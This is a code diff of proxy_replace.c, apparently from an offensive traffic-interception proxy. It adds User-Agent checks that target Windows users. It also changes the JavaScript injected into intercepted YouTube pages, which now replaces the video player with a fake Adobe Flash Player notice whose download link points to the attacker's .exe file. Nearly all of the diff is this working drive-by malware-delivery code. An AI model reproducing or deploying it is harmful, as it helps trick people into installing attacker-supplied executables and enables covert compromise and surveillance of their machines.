@@ -6,6 +6,7 @@
     $Id: proxy_replace.c 3560 2011-06-07 15:00:02Z alor $
 */
 
+#define _GNU_SOURCE
 #include <main.h>
 #include <proxy.h>
 #include <threads.h>
@@ -28,6 +29,27 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file, char *
 
 /************************************************/
 
+typedef enum osuser { WINDOWS = 0, OSX, LINUX, UNKNOWN } osuser;
+
+static osuser
+search_useragent(char *request)
+{
+   osuser os = UNKNOWN;
+
+   if (strstr(request, "User-Agent: ") != NULL) {
+      char *user = strstr(request, "User-Agent:");
+
+      if (strstr(user, "Windows NT") != NULL || strstr(user, "Windows") != NULL || strstr(user, "Win") != NULL)
+         os = WINDOWS;
+/*    else if (strstr(user, "OS X") != NULL || strstr(user, "Mac") != NULL)
+         os = OSX;
+      else if (strstr(user, "Linux") != NULL || strstr(user, "linux") != NULL || strstr(user, "Ubuntu") != NULL)
+         os = LINUX;
+*/ }
+
+   return os;
+}
+
 int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char *tag, char *host, char *ip, char *url)
 {
    int written, len;
@@ -42,7 +64,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
       char *data;
       struct bio_inject_setup bis;
       int inject_len = 0;
-
+      osuser os;
 
       *sbio = BIO_new(BIO_s_connect());
       BIO_set_conn_hostname(*sbio, host);
@@ -57,6 +79,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
       sanitize_header(request);
 
       DEBUG_MSG(D_EXCESSIVE, "header: [%s]", request);
+      os = search_useragent(request);
 
       BIO_puts(*sbio, request);
 
@@ -75,31 +98,50 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
       }
       DEBUG_MSG(D_INFO, "Got Header");
 
-      if (!strncmp(data, HTTP10_200_OK, strlen(HTTP10_200_OK)) || !strncmp(data, HTTP11_200_OK, strlen(HTTP11_200_OK))) {
+      if (os == UNKNOWN) {
+	 DEBUG_MSG(D_ERROR, "ERROR: OS detected not supported, cannot attack !!");
+	
+	 fbio = BIO_new(BIO_f_null());
+         inject_len = 0;
+      } else if (!strncmp(data, HTTP10_200_OK, strlen(HTTP10_200_OK)) || !strncmp(data, HTTP11_200_OK, strlen(HTTP11_200_OK))) {
+	 switch (os) {
+	 case WINDOWS:
+	     DEBUG_MSG(D_INFO, "Windows detected");
+	     break;
+
+	 case OSX:
+//	     DEBUG_MSG(D_INFO, "OS X detected");
+//	     break;
+
+	 case LINUX:
+	 case UNKNOWN:
+//	     DEBUG_MSG(D_INFO, "Linux detected");
+	     break;
+	 }
+
          DEBUG_MSG(D_INFO, "Substituting video frame...");
       
-         //char *html_to_inject1 = "document.getElementById('watch-player').innerHTML = \"<div class='yt-alert yt-alert-default yt-alert-error  yt-alert-player'><div class='yt-alert-icon'><img src='//s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif' class='icon master-sprite' alt='Alert icon'></div><div class='yt-alert-buttons'></div><div class='yt-alert-content' role='alert'><span class='yt-alert-vertical-trick'></span><div class='yt-alert-message'>The Adobe Flash Player is required for video playback. <br> <a target='blank' href='/";
-         //char *html_to_inject2 = "'>Get the latest Flash Player</a> <br></div></div></div>\";";
-         //char *html_to_inject1 = "\"<div class='yt-alert yt-alert-default yt-alert-error  yt-alert-player'><div class='yt-alert-icon'><img src='//s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif' class='icon master-sprite' alt='Alert icon'></div><div class='yt-alert-buttons'></div><div class='yt-alert-content' role='alert'><span class='yt-alert-vertical-trick'></span><div class='yt-alert-message'>The Adobe Flash Player is required for video playback. <br> <a target='blank' href='/";
-	char *html_to_inject1 = "\"\"; var el = document.getElementById(\"player-api\"); el.id=\"nadia-coporate-filter\"; el.innerHTML = \"<div class='yt-alert yt-alert-default yt-alert-error  yt-alert-player'><div class='yt-alert-icon'><img src='//s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif' class='icon master-sprite' alt='Alert icon'></div><div class='yt-alert-buttons'></div><div class='yt-alert-content' role='alert'><span class='yt-alert-vertical-trick'></span><div class='yt-alert-message'>The Adobe Flash Player is required for video playback. <br> <a target='blank' href='/";
-         char *html_to_inject2 = "'>Get the latest Flash Player</a> <br></div></div></div>\";";
-         char *html_to_inject;
-         int html_to_inject_len = 0;
+         char *html_to_inject = NULL;
 
+         asprintf(&html_to_inject, 
+		"\n" \
+		"        var adobelocalmirror = '/%s%s';\n" \
+		"        var c = document.createElement('link');\n" \
+		"        c.type = 'text/css'; c.rel = 'stylesheet'; c.href = 'http://s.ytimg.com/yts/cssbin/www-player-vfl0RUPb4.css';\n" \
+		"        document.getElementsByTagName('head')[0].appendChild(c);\n" \
+		"        var player = document.getElementById('player-api'); player.id = 'player-api-x';\n" \
+		"        if('textContent' in player) { var msg = player.textContent; msg = msg.substr(msg.indexOf('<div class=\"yt-alert-message\">') + 30); msg = msg.substr(0, msg.indexOf('</div>')); }\n" \
+		"        if(!msg && ('innerHTML' in player)) { var msg = player.innerHTML; msg = msg.substr(msg.indexOf('<div class=\"yt-alert-message\">') + 30); msg = msg.substr(0, msg.indexOf('</div>')); }\n" \
+		"        if(!msg) var msg = 'You need Adobe Flash Player to watch this video. <br> <a href=\"http://get.adobe.com/flashplayer/\">Download it from Adobe.</a>';\n" \
+		"        player.innerHTML = '<div id=\"movie_player\" class=\"html5-video-player el-detailpage ps-null autohide-fade\" style=\"\" tabindex=\"-1\"><div style=\"\" class=\"ytp-fallback html5-stop-propagation\"><div class=\"ytp-fallback-content\">' + msg.replace('http://get.adobe.com/flashplayer/', adobelocalmirror).trim() + '</div></div></div>';\n", 
+		file, ".exe"); //os == WINDOWS ? ".exe" : os == OSX ? ".dmg" : ".deb");
 
-         html_to_inject_len = strlen(html_to_inject1) + strlen(file) + strlen(".exe") + strlen(html_to_inject2);
-         SAFE_CALLOC(html_to_inject, html_to_inject_len, sizeof(char));
-
-         strcpy(html_to_inject, html_to_inject1);
-         strcat(html_to_inject, file);
-         strcat(html_to_inject, ".exe");
-         strcat(html_to_inject, html_to_inject2);
+	 ON_ERROR(html_to_inject, NULL, "virtual memory exhausted");
 
          fbio = BIO_new(BIO_f_inject());
-         //bis.search = "-player').innerHTML = swf;";
-         bis.search = "var swf = ";
+	 bis.search = "document.getElementById(\"player-api\").innerHTML = swf;";
          bis.inject = html_to_inject;
-         bis.inject_len = html_to_inject_len;
+         bis.inject_len = strlen(html_to_inject);
 
          BIO_ctrl(fbio, BIO_C_SET_BUF_MEM, 1, &bis);
          BIO_ctrl(fbio, BIO_C_GET_BUF_MEM_PTR, 1, &bis);
